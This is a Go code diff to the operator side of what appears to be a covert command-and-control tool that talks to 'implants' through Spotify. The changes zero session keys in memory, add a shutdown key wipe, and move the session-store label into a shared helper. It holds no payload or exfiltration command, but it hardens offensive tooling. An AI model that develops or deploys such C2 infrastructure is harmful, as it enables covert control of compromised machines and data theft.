@@ -100,7 +100,10 @@ type kxJob struct {
 // (agents, session keys, pending seqs, history, attach state). op.pollMu
 // serializes PollResults so only one goroutine polls Spotify at a time.
 type Operator struct {
-	client       *spotify.Client
+	client *spotify.Client
+	// NOTE: key is a Go string — it cannot be reliably wiped from
+	// memory (immutable, GC copies it). Only []byte session keys are
+	// zeroed (see zeroKey).
 	key          string
 	pollInterval time.Duration
 	historyFile  string
@@ -299,6 +302,9 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 				result, decErr = protocol.DecodeMessageRaw(payload, sk)
 				if decErr == nil {
 					// Implant confirmed the key exchange — promote to active
+					if old, ok := op.sessionKeys[cid]; ok {
+						zeroKey(old)
+					}
 					op.sessionKeys[cid] = sk
 					delete(op.pendingKeys, cid)
 					op.saveSessionKeysLocked()
@@ -522,6 +528,7 @@ func (op *Operator) Interactive() {
 	defer func() {
 		close(stopCh)
 		op.sendShutdown()
+		op.WipeKeys()
 		op.FlushHistory()
 	}()
 
@@ -1089,8 +1096,14 @@ func (op *Operator) handleCheckinLocked(result map[string]interface{}) *kxJob {
 		// Different session — agent reconnected, update and re-negotiate
 		fmt.Printf("\n\033[36m[*] Implant %s reconnected (new session)\033[0m\n",
 			clientID[:8])
-		delete(op.sessionKeys, clientID)
-		delete(op.pendingKeys, clientID)
+		if old, ok := op.sessionKeys[clientID]; ok {
+			zeroKey(old)
+			delete(op.sessionKeys, clientID)
+		}
+		if old, ok := op.pendingKeys[clientID]; ok {
+			zeroKey(old)
+			delete(op.pendingKeys, clientID)
+		}
 		op.saveSessionKeysLocked()
 	}
 	pid := 0
@@ -1332,11 +1345,27 @@ func (op *Operator) FlushHistory() {
 	op.flushHistoryLocked()
 }
 
+// WipeKeys zeroes all session and pending key bytes and clears the
+// maps. Call on shutdown so forward-secrecy keys don't linger in the
+// heap until GC.
+func (op *Operator) WipeKeys() {
+	op.mu.Lock()
+	defer op.mu.Unlock()
+	for cid, sk := range op.sessionKeys {
+		zeroKey(sk)
+		delete(op.sessionKeys, cid)
+	}
+	for cid, sk := range op.pendingKeys {
+		zeroKey(sk)
+		delete(op.pendingKeys, cid)
+	}
+}
+
 // --- Session key persistence (opt-in) ---
 
 // sessionStoreKey derives the encryption key for the on-disk session store.
 func (op *Operator) sessionStoreKey() []byte {
-	return crypto.ComputeHMACSHA256([]byte(op.key), []byte("spotexfil-session-store"))
+	return crypto.ComputeHMACSHA256([]byte(op.key), []byte(shared.SessionStoreLabel()))
 }
 
 // loadSessionKeys restores persisted session keys from disk.
